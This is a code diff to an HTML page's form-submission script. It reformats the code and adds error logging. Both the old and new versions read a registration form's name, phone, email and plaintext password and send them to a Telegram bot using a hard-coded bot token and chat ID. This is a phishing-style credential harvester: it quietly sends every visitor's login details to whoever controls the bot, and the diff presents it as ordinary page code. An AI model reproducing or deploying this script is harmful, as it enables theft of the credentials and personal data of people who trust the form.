@@ -168,34 +168,43 @@
 	
 	<script>
 		document.getElementById("registrationForm").addEventListener("submit", function(event) {
-			event.preventDefault();
-			const name = document.getElementById("name").value;
-			const phone = document.getElementById("phone").value;
-			const email = document.getElementById("email").value;
-			const password = document.getElementById("password").value;
-			const message = `New Registration:\n\nName: ${name}\nPhone: ${phone}\nEmail: ${email}\nPassword: ${password}`;
-			const botToken = "7787010417:AAHLppc9xz2o9RstlWNjYrtDwXfrVV4Px_g";
-			const chatId = "6992364240";
-			const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-			const data = { chat_id: chatId, text: message };
-			fetch(url, {
-				method: "POST",
-				headers: { "Content-Type": "application/json" },
-				body: JSON.stringify(data)
-			})
-			.then(response => response.json())
-			.then(result => {
-				if (result.ok) {
-					alert("Registration data sent successfully!");
-				} else {
-					alert("Failed to send data. Please try again.");
-				}
-			})
-			.catch(error => {
-				console.error("Error:", error);
-				alert("An error occurred while sending data.");
-			});
-		});
+    event.preventDefault();
+
+    const name = document.getElementById("name").value;
+    const phone = document.getElementById("phone").value;
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    const message = `New Registration:\n\nName: ${name}\nPhone: ${phone}\nEmail: ${email}\nPassword: ${password}`;
+
+    const botToken = "7787010417:AAHLppc9xz2o9RstlWNjYrtDwXfrVV4Px_g";
+    const chatId = "6992364240";
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    const data = {
+        chat_id: chatId,
+        text: message
+    };
+
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(result => {
+        if (result.ok) {
+            alert("Registration data sent successfully!");
+        } else {
+            alert("Failed to send data.");
+            console.error("Telegram Error:", result);
+        }
+    })
+    .catch(error => {
+        alert("An error occurred while sending data.");
+        console.error("Fetch Error:", error);
+    });
+});
 	</script>
 </body>
 </html>
